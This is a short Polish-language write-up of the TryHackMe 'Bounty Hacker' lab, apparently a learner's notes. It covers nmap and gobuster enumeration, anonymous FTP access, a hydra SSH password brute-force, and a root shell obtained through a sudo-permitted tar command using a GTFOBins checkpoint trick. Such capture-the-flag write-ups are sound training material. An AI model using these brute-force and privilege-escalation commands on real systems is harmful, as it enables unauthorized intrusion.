
# TryHackMe „Bunty Hacker”

## 1. Informacje ogólne
Pokój Bounty Hacker na TryHackMe uczy podstawowego procesu zdobywania dostępu: enumeracji usług, wykorzystania słabego hasła oraz przejęcia konta przez FTP i SSH.  
Kończy się prostą eskalacją uprawnień, która pokazuje, jak niewłaściwe konfiguracje systemu mogą prowadzić do pełnego przejęcia maszyny.  

---

## 2. Metodologia 
 **Narzędzia:** nmap ,gobuster, hydra, ssh
 
## 3. Podsumowanie zadania
  **Skanowanie wstępne:**
  
### Nmap:
```bash
sudo nmap -sV -sS -p- -A 10.80.183.80
```
Otwarte porty:
- ftp 21
- ssh 22
-http 80

### Gobuster:

```bash
gobuster dir -u 10.80.183.80 -w /usr/share/wordlists/dirb/common.txt
```

Znajduje nam dwa katalogi ,w jednym jest zjdęcie , pobieramy i badamy  - nic nie znajdujemy

W nmap dostaliśmy info że na ftp jest możlwe zalowanie się jako anonymous .
Po wejście dostajemy dwa pliki tekstowe

1 ma permision denide
Pobieramy  2 plik txt i po tej opercji możem pobrac ponownie 1

Znajdujemy login , drugi plik textowy zawiera hasła

### Hydra: 

```bash
hydra -l lin -P locks.txt ssh://10.80.183.80
```

### SSH:  
```bash
ssh lin@IP
```

Zostajemy zalowani na usera lin , otrzymujemy pierwsza flage  
sprawdzamy czy ma jakięs uprawniani do root:  

```bash
sudo -l
```
Otrzymujemy informacje 
(root) /bin/tar

Wchodzimy na strone 
```url 
https://gtfobins.github.io/
```

Wyszukujemy tar i dostajemy podpowiedź:  
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 –checkpoint-action=exec=/bin/sh
```

Dostajemy root i odczytujemy kolejną flagę
